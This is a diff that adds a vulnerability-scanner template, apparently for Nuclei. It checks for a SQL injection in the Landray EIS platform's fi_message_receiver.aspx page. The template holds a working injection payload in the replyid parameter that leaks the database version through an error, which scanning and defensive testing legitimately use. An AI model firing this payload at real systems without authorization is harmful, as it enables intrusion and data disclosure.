@@ -1,0 +1,18 @@
+id: landray-eis-receiver-sqli
+info:
+  name: Template Name
+  author: wangzong
+  severity: high
+  description: 蓝凌EIS智慧协同平台 fi_message_receiver.aspx SQL注入漏洞
+  reference:
+    - https://
+  tags: tags
+http:
+  - method: GET
+    path:
+      - "{{BaseURL}}/Message/fi_message_receiver.aspx?replyid=1%20and%201=@@version--+"
+    matchers:
+      - type: word
+        part: body
+        words:
+          - 'nvarchar'
